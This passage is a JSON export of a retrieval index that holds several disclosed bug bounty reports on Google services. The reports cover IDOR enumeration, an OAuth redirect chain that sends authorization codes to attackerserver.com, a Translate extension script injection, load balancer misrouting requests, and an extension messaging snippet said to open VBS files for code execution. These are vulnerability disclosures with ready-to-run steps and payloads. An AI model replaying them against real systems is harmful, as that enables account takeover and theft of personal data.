"file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d0312b7a-cb5a-48ac-b6d9-5a6f41567582", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_372239.clean.txt", "file_name": "20250408_175710_372239.clean.txt", "file_type": "text/plain", "file_size": 718, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c562142734cdd63c8e918b9f238e23c3648ea67c7008e4f2da055cdd6340542a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: The issue here is that the vulnerable webapplication doesn\u2019t check if the endpoint URL provided the value\r\nVulnerable Domain:\r\nhttps://opensourcelive.withgoogle.com\r\nStep to Reproduce this vulnerability:\r\nLogin your account, Already Done\r\nGo to profile -> Account Setting\r\nClick Update Email and Intercept The Request into Burpsuit\r\nChange Request Method PUT To GET\r\nthe URL Endpoint->api/user_profiles/{injection-point} Enter Any user profile id\r\nYou Got the User-Email-id, FirstName, Lastname\r\nPOC Video LInk->\r\nhttps://www.youtube.com/watch?v=KZ1mJwvmA_g\r\nAttack scenario:\r\nAttacker Got the user information just like for example: -User-Email id, First name. Last Name as a lead an Information Disclosure", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 716, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "adf9acaa-bde0-4fbf-afcd-91ff1f741fc3": {"__data__": {"id_": "adf9acaa-bde0-4fbf-afcd-91ff1f741fc3", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_289844.clean.txt", "file_name": "20250408_175724_289844.clean.txt", "file_type": "text/plain", "file_size": 634, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "7b74d5e1-2d02-41bb-aff0-08fb84f18a61", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_289844.clean.txt", "file_name": "20250408_175724_289844.clean.txt", "file_type": "text/plain", "file_size": 634, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "fc60d2a68a3892a9918d478c96e68162378d8c41477124c7ef29e624d49c8583", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: IDOR leads to information Disclosure\r\nSteps to reproduce:\r\nOpen any portfolio page on\r\nwww.appsheet.com\r\n,\r\nexample:\r\nhttps://www.appsheet.com/portfolio/109795\r\nCheck page source code.\r\nHere you see that user email is disclosed through hidden input type name=partner\r\nexample\r\nNow attacker can increment or decrement portfolio id to fetch users email id\r\nCode Snippet example:\r\n<input name=\"partner\" type=\"hidden\" value=\"[REDACTED_EMAIL]\" />\r\nAttack scenario:\r\nAttacker is able to enumerate portfolio id to fetch company information And email id\r\nAcquisition info:\r\nhttps://blog.appsheet.com/appsheet-acquired-by-google-cloud", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 634, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e6c2657e-cf38-4d41-811b-2036cd108d93": {"__data__": {"id_": "e6c2657e-cf38-4d41-811b-2036cd108d93", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_327774.clean.txt", "file_name": "20250408_175733_327774.clean.txt", "file_type": "text/plain", "file_size": 1158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0137a2cc-9011-4a3f-b5ea-eb440d83efeb", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_327774.clean.txt", "file_name": "20250408_175733_327774.clean.txt", "file_type": "text/plain", "file_size": 1158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "3b6f89f3d72456ece2c31ed8ebda24eec8805970196aefe496d7ceb2b8611c53", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Brute-Force is available for getting Google Voice Activity\r\nSteps to reproduce:\r\nEnter\r\nhttps://history.google.com/history/audio?utm_source%3Dhelp\r\nGet any Audio URL (It made with Google Assistant or Home. In my case:\r\nhttps://myactivity.google.com/history/audio/play/1537073323337432?authuser=1\r\n)\r\nUse <audio> tag in somewhere and Notify that you can listen. (In my case:\r\nhttp://jsfiddle.net/L7jyx5qr/1/\r\nand sorry for autoplay)\r\nBrowser/OS: I believe that it works everywhere. But it's my environment:\r\nMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\r\nUbuntu 18.04\r\nAttack scenario:\r\nAny site can get Voice Activity with\r\nhttps://myactivity.google.com/history/audio/play/<NUMBER>?authuser=<USER NUMBER. GENERALLY 0>\r\n(well, it needs brute-force or social engineering(get copy of site)) as <audio> tag (on that user's browser).\r\nIf found voice link(Etc: robots.txt allows\r\n/\r\n, but I didn't test about it), it can be exported:\r\nhttps://github.com/mattdiamond/Recorderjs\r\nSite's owner(yes, he's attacker) can get the voice data.\r\nThis vuln can leak users' voice data; personal information.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1158, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "aee514f5-4b76-4bd6-b654-e1aaa621d745": {"__data__": {"id_": "aee514f5-4b76-4bd6-b654-e1aaa621d745", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_385791.clean.txt", "file_name": "20250408_175654_385791.clean.txt", "file_type": "text/plain", "file_size": 2786, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0a6859b0-3a8f-41bf-936f-bf7c59d329a2", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_385791.clean.txt", "file_name": "20250408_175654_385791.clean.txt", "file_type": "text/plain", "file_size": 2786, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "4a53e2b88666580fadf5cd81740b7a083902f7ec61c8ceb6dea1255ad9373033", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nCloud Tools for Eclipse - Chaining misconfigured OAuth callback redirection with open redirect vulnerability to leak Google OAuth Tokens with full GCP Permissions\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=572124029240-i0vhlk5ibeqbufl5e56ttdbs20ucj2k1.apps.googleusercontent.com&redirect_uri=http://localhost:8080/_ah/login?continue=http://attackerserver.com/collect&response_type=code&scope=email%20https://www.googleapis.com/auth/cloud-platform&service=lso&o2v=1&flowName=GeneralOAuthFlow\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nThe \"Google Cloud Tools for Eclipse plugin\" uses a Google OAuth login flow to get authorized to access a user's GCP account. By chaining an insecure redirect/callback URL configuration with an open redirect vulnerability in the local appengine development server that the plugin creates, an attacker can abuse the user's trust in the plugin to steal their OAuth tokens.\r\nThe attack conditions are as follows:\r\nThe user has installed the Cloud Tools for Eclipse plugin as described\r\nhere\r\nThe user has created a starter appengine project in Eclipse following steps\r\nThe user has run the project as appengine as described\r\nThe attack steps are as follows:\r\nThreat actor provides user with a Google OAuth authorization URL that has the trusted \"Cloud Tools for Eclipse\" branding and \"\r\ncloud-java-team@google.com\r\n\" developer info.  The URL has a maliciously crafted \"redierct_uri\" parameter value as follows:\r\nUser is presented with the \"Cloud Tools for Eclipse wants to access your Google Account\" page and grants the access.\r\nHost at\r\naccounts.google.com\r\nresponds with a redirect to the following location:\r\nhttp://localhost:8080/_ah/login?continue=http://attackerserver.com/collect&code=REDACTED&scope=email%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20openid&authuser=2&prompt=consent\r\nThis redirected location (screenshot attached) is the sign-on page of the\r\nbuilt-in Users Service from the local appengine development server\r\nOnce user clicks on either of the \"Log out\" or \"Log in\" buttons, they are redirected to\r\nhttp://attackerserver.com/collect\r\nand the request contains a referrer header of the localhost:8080 origin containing the OAuth authorization code.\r\nAttack scenario\r\nAs previously described, the attack can be performed by an external threat actor. The attack requires some user interaction but success is reasonably high if done via a social engineering campaign.\r\nIf successful, a threat actor is able to exfiltrate the victim's Google Authorization code which they can easily exchange for access and refresh tokens with permissions to perform all API actions against the victim's GCP account.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2786, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "36d02be3-e2f2-4e12-8474-dc236b940f6a": {"__data__": {"id_": "36d02be3-e2f2-4e12-8474-dc236b940f6a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_832305.clean.txt", "file_name": "20250408_175721_832305.clean.txt", "file_type": "text/plain", "file_size": 1331, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "9d6943d2-b427-4b63-934c-6458263db087", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_832305.clean.txt", "file_name": "20250408_175721_832305.clean.txt", "file_type": "text/plain", "file_size": 1331, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ab28b5939302775f9fce488dfc63d55693bfd1b3f1aa1ab6a4f1b0cbffc58946", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: UXSS when a renderer process is compromised\r\nSteps to reproduce:\r\nInstall the extension (\r\nhttps://chrome.google.com/webstore/detail/google-translate/aapbdbdomjkkjkaonfhkkikfgjllcleb\r\n)\r\nOpen any page, and then open DevTools\r\nChange the JS execution context to the Google translate's content script, and execute\r\nchrome.storage.local.set({gtxTargetLang:\"test'+alert(1)+'\"});\r\nOpen\r\nhttps://www.google.com/robots.txt\r\nand then click on Google Translate icon and click \"translate this page\"\r\nObserve the alert(1)\r\nBrowser/OS: Chrome/Windows 10\r\nAttack scenario:\r\nVulnerable code:\r\nfunction Hb(a, b, c) {\r\nb = {\r\npageLang: b,\r\nuserLang: c // <-----------------[1]\r\n};\r\nb.content = u(Fb, b)\r\n.replace(/\\\\/g, \"\\\\\\\\\")\r\n.replace(/'/g, \"\\\\'\")\r\n.replace(/\"/g, '\\\\\"')\r\n.replace(/\\n/g, \"\\\\n\");\r\nchrome.tabs.executeScript(a, {\r\ncode: u(Gb, b)\r\n}, function() {\r\nchrome.runtime.lastError && console.error(chrome.runtime.lastError.message)\r\n})\r\n}\r\nUser language is injected to a script which will then injected to a page that require a translation. Problem here is that, the user language can be changed from a content script using\r\nchrome.storage.local.set\r\n.\r\nTherefore, a compromised renderer can set a value which can escape a string declaration in the JS code, and run arbitrary script in the site which were meant to be translated.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1331, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "77208e08-4dec-4d87-8ead-d2c7ecef08b1": {"__data__": {"id_": "77208e08-4dec-4d87-8ead-d2c7ecef08b1", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.clean.txt", "file_name": "20250408_175647_400945.clean.txt", "file_type": "text/plain", "file_size": 4783, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8a669b95-3494-41d6-b8bb-b35d05e1bd23", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.clean.txt", "file_name": "20250408_175647_400945.clean.txt", "file_type": "text/plain", "file_size": 4783, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "43b68e0edaffe726b3c731a713da1bda86eb76fc2144511690b47086912545fc", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "ae48282f-d5dd-4493-9bf6-ba62be0734f4", "node_type": "1", "metadata": {}, "hash": "9bbcda4fdf9d6571b29fc8d6bfbfdbb4606a4d577e0b45109d80e4f901c5cf55", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nA 0 day misrouting vulnerability was found affecting all gcp load balancers that serve content from a backend bucket by default.\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://console.cloud.google.com/net-services/loadbalancing\r\nVulnerability type:\r\nOther\r\nDetails\r\nI have discovered this vullnerability through fuzzing on a bug bounty session. I have found over 5000 instances that returned a response indicating the actual name of the bucket. Here is an example, we\u2019ll use the website web1-dev.vellum-stg.sc-corp.net which is a vulnerable load balancer instance I found in the wild:\r\nRequest:\r\nGET @fuzz/ HTTP/1.1\r\nHost: web1-dev.vellum-stg.sc-corp.net\r\nConnection: close\r\nResponse:\r\n<?xml version='1.0' encoding='UTF-8'?><Error><Code>InvalidBucketName</Code><Message>The specified bucket is not valid.</Message><Details>Invalid bucket name: 'vellum-sc-backend-bucket-for-protection@fuzz'</Details></Error>\r\nThis error discloses the real name of the bucket behind the load balancer:\r\nvellum-sc-backend-bucket-for-protection\r\nscreenshot: fuzzing.png\r\nAfter ananlysing this behaviour, I came to the understanding that the load balancer by default concatenates whatever comes before the \u201c/\u201c in the path with the actual name of the bucket.\r\nTo my understanding, the request sent from the load balancer to the storage endpoint might look like the following:\r\nGET vellum-sc-backend-bucket-for-protection@fuzz/ HTTP/1.1\r\nHost: storage.googleapis.com\r\nThis would mean that misrouting the request to any bucket whose name starts with\r\nis possible. To confirm this, I have created a storage bucket on my account with the same bucket named + \"-pwn\" suffix. So my bucket would be named: vellum-sc-backend-bucket-for-protection-pwn.\r\nI have uploaded an index.html to my bucket and sent the following malformed request to the vulnerable load balancer:\r\nGET -pwn/index.html HTTP/1.1\r\nAs expected, the load balancer returned the content of my bucket in the response instead of throwing an error.\r\nscreenshot: -pwn:index.png\r\nPOC\r\nTo confirm that this vulnerability originates from google and not a misconfiguration from the client side, I have followed this tutorial\r\nhttps://cloud.google.com/load-balancing/docs/https/ext-load-balancer-backend-buckets\r\nto create:\r\nBucket A: \"misrouting-vulnerability\"\r\nBucket B: \"misrouting-vulnerability-private\"\r\nA load balancer configured by default to serve content from bucket A as backend. Address:\r\nhttp://34.107.180.11\r\nHost, Path rules are left to default.\r\nSteps\r\nSend the following request to\r\nGET /index.html HTTP/1.1\r\nHost: 34.107.180.11\r\nNotice \"Yuhuu\" returned in the respone.\r\nscreenshot: mybucket.png\r\nThen send the following request:\r\nGET -private/index.html HTTP/1.1\r\nAnd notice the response changing to \"POC\".\r\nscreenshot: -private:index.png\r\nPS: If the content does not show immediately, send the request multiple times until you see the designated response.\r\nAttack scenario\r\nDisclosure of the bucket name\r\n: While the bucket name could be considered public information, clients do not expect load balancers to disclose the name of the bucket with error messages. This could allow attackers to conduct further attacks directly on the bucket without having to pass through the load balancer or any firewalls that might be put in place.\r\nAbility to communicate custom responses to load balancers\r\n: Threat actors could set their buckets to return custom headers starting with \u201cx-goog-meta-key\u201d in the response returned by their bucket through a command like the following:\r\ngsutil setmeta -h \"x-goog-meta-redirect-url:https://www.google.com\" gs://vellum-sc-backend-bucket-for-protection-pwn/index.html\r\nThose same headers will be reflected in the response of the misrouted request. If the load balancer has custom rules for dealing with such headers(redirection, cache..), attackers could tamper with their values through the issue discussed in this report.\r\nscreenshot: cloudshell headers.png\r\nscreenshot: custom headers.ong\r\nRisk of leakage of information through the logs\r\n: The requests sent by load balancers to the buckets could be found in the threat actor's access logs:\r\nhttps://cloud.google.com/storage/docs/access-logs\r\n.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4175, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ae48282f-d5dd-4493-9bf6-ba62be0734f4": {"__data__": {"id_": "ae48282f-d5dd-4493-9bf6-ba62be0734f4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.clean.txt", "file_name": "20250408_175647_400945.clean.txt", "file_type": "text/plain", "file_size": 4783, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8a669b95-3494-41d6-b8bb-b35d05e1bd23", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.clean.txt", "file_name": "20250408_175647_400945.clean.txt", "file_type": "text/plain", "file_size": 4783, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "43b68e0edaffe726b3c731a713da1bda86eb76fc2144511690b47086912545fc", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "77208e08-4dec-4d87-8ead-d2c7ecef08b1", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.clean.txt", "file_name": "20250408_175647_400945.clean.txt", "file_type": "text/plain", "file_size": 4783, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "eb545a6e22d3666b6e2649f83db2d883f07e01edee0aad2324f75eb6ac0b2fa6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Ability to communicate custom responses to load balancers\r\n: Threat actors could set their buckets to return custom headers starting with \u201cx-goog-meta-key\u201d in the response returned by their bucket through a command like the following:\r\ngsutil setmeta -h \"x-goog-meta-redirect-url:https://www.google.com\" gs://vellum-sc-backend-bucket-for-protection-pwn/index.html\r\nThose same headers will be reflected in the response of the misrouted request. If the load balancer has custom rules for dealing with such headers(redirection, cache..), attackers could tamper with their values through the issue discussed in this report.\r\nscreenshot: cloudshell headers.png\r\nscreenshot: custom headers.ong\r\nRisk of leakage of information through the logs\r\n: The requests sent by load balancers to the buckets could be found in the threat actor's access logs:\r\nhttps://cloud.google.com/storage/docs/access-logs\r\n.\r\nIf the load balancer is configured to send sensitive data especially in the url of the request(such as private keys or url signatures), the attacker would be able to access this information by enabling and inspecting their exploit bucket access logs.\r\nResource exhaustion\r\n: The load balancer data transfer usage is billed per GiB:\r\nhttps://cloud.google.com/vpc/network-pricing#lb\r\n. Attackers could host large files on their own buckets and abuse their target\u2019s load balancer to fetch them. This could lead to important extra charges for the client or complete denial of service in some cases.", "mimetype": "text/plain", "start_char_idx": 3281, "end_char_idx": 4771, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b83685bf-a560-4c21-b1e4-e1353a2e47c3": {"__data__": {"id_": "b83685bf-a560-4c21-b1e4-e1353a2e47c3", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_772253.clean.txt", "file_name": "20250408_175649_772253.clean.txt", "file_type": "text/plain", "file_size": 930, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f4b56dbb-3650-47a2-b3d0-7557ca9c593e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_772253.clean.txt", "file_name": "20250408_175649_772253.clean.txt", "file_type": "text/plain", "file_size": 930, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9c989dede59030103fa75dcd21dd8724a6f7498b1fe1c813aad6643d314fb5c4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nIDOR leads to Information disclosure\r\nProduct:\r\nFitbit (Services)\r\nURL:\r\nhttps://www.fitbit.com/foods/Private+Food+1/809420363/edit\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nHere we have used two users for POC.\r\nFirst, we have to create a private food and we have added a private brand to make sure this is not visible to others and is private to user A only.\r\nThen I tried to edit the private food and noticed that the URL contains a numerical value.\r\nSo, I tried to log in as User B, then tried to create a new private food.\r\nAfter the creation of the food, tried to edit the item. While trying to edit the item, i have changed the numerical value and used the numerical value of the first user.\r\nAttack scenario\r\nHere, an attacker can simply bruteforce the numerical part of the URL and then try to enumerate the private food items added by users and also they can see the private brand names of other users.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 930, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2c06c253-8c5c-47ab-af07-89ec5f04d5ff": {"__data__": {"id_": "2c06c253-8c5c-47ab-af07-89ec5f04d5ff", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_661763.clean.txt", "file_name": "20250408_175649_661763.clean.txt", "file_type": "text/plain", "file_size": 1198, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a2bd4517-2dec-4d35-8ca5-389597f4d3b9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_661763.clean.txt", "file_name": "20250408_175649_661763.clean.txt", "file_type": "text/plain", "file_size": 1198, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "988f1e88d751395bc765d67a3dc4271c375d24bf192b47d94250051aad47f56c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nLax messaging rules on Application Launcher For Drive\r\nProduct:\r\nGoogle Drive\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/application-launcher-for/lmjegmlicamnimmfhcmpkclmigmmcbeh\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nAny attacker on the same network can send messages to a proxy that opens whatever file they want shared in there google drive as long as there's a shortcut to it.\r\nAnd subdomains are also allowed which maybe a problem if someone finds an XSS :)\r\nThe lax rules that allow insecure origins:\r\n\"externally_connectable\": {\r\n\"matches\": [\r\n\"\r\n://\r\n.google.com/*\"\r\n]\r\n},\r\nThe following code runs a VBS script on the victim.\r\nRun the following on any google subdomain including insecure http:// ones.\r\nlet api = chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh', {name: 'com.google.drive.nativeproxy'});\r\nlet request = 'native_opener/v2/3/' + btoa('[\"<VICTIM EMAIL>\", \"<SHARED FILE ID>\",\"VkJTRmlsZQ\",\"\"]');\r\napi.postMessage(request);\r\nAttack scenario\r\nIf the attacker has local network access or a browser extension with any google subdomain and they share a google drive with the victim they can force them to open a VBS file resulting in RCE.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1198, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c90e676b-639e-4eaf-9acc-7e2f4f7d657d": {"__data__": {"id_": "c90e676b-639e-4eaf-9acc-7e2f4f7d657d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_934235.clean.txt", "file_name": "20250408_175651_934235.clean.txt", "file_type": "text/plain", "file_size": 2696, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "dc87aed5-d67a-4fef-b73d-f2c0f533f5bc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_934235.clean.txt", "file_name": "20250408_175651_934235.clean.txt", "file_type": "text/plain", "file_size": 2696, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "fb57dbcf3ba3980c86b84b2d5919241f6080400afe714d16bdbb73d478ce8784", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Google Play Services give users a browser with a suspicious JavaScript bridge and without parental control.\r\nSteps to reproduce:\r\nGo to a Google app that uses Google Play Services and allows you to go into \"manage your account\"  (such as settings->google, maps->account icon, etc.).\r\nClick \"Manage your account.\"\r\nGo to security, then \"Password Manager\", then click on the settings icon.\r\nClick on \"Set up\" in the \"On-device encryption\" section.\r\nClick on \"Learn more about on-device encryption.\"\r\nClick on the hamburger icon, then \"Privacy Policy\", scroll down until the end, and click the link named \"Google\".\r\nLog out of the account (click on the account icon and click \"Sign out\". It will log you out temporarily.)\r\nNow you have a browser without any restrictions and with the suspicious Java bridge (called \"mm\").\r\nTo see the suspicious JavaScript bridge,\r\nSearch for a JavaScript console such as \"eruda\", go to it, and then activate it.\r\nType \"mm\", and expand the object.\r\n\"mm\" is the  suspicious JavaScript bridge, and every website you visit has access to it.\r\nBrowser/OS: Android (with a Google account)\r\nAttack scenario:\r\nFirst, it will get a private browser without parental control that will not show up in history on any Android without needing to install another browser.\r\nSecond, this is a security risk and not a proven vulnerability,  and this is the \"mm\" JavaScript bridge (called 'FolsomJsBridge' in the code):\r\n\"mm\" has three methods (all returns void):\r\naddEncryptionRecoveryMethod(String str_without_use, Sting json_members_string, String bytes_as_json, int i )\r\nsetVaultSharedKeys(String str_without_use, String full_json_string)\r\nboth of this methods get json of {0:{0:number1},{1:number2},1:{0:number1},{1:number2}}.\r\ncloseView(): just close the webView. Not a security vulnerability by itself but can be useful in some cases. For example, if someone finds an intent that could start this browser with a given URL, this could be used to hide a malicious website after it does something with the previous functions.\r\nThis risk may have a lot of potential in these cases:\r\nIf  one of these functions writes to a user-controlled file, then it's a privilege escalation\r\nIf some intent could trigger this browser to go into a user-controlled website, then it's ransom - the attacker could set its own keys, and ask for money for the decryption.\r\nIf someone gives the attacker his phone open on a pinned app that uses GMS (such as Maps, some of the phone apps, Keep, etc. ), then the attacker could go into the web and use the full Google suite. For example, look at private photos, or send himself an email with the private information. Then it's a pinned-app bypass.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2696, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "17841a25-326f-4baf-ae69-528c9bd6b8d5": {"__data__": {"id_": "17841a25-326f-4baf-ae69-528c9bd6b8d5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_277048.clean.txt", "file_name": "20250408_175654_277048.clean.txt", "file_type": "text/plain", "file_size": 2642, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "862d9f24-b20a-42bd-862c-4620d7b657e1", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_277048.clean.txt", "file_name": "20250408_175654_277048.clean.txt", "file_type": "text/plain", "file_size": 2642, "creation_date": "2025-04-22", 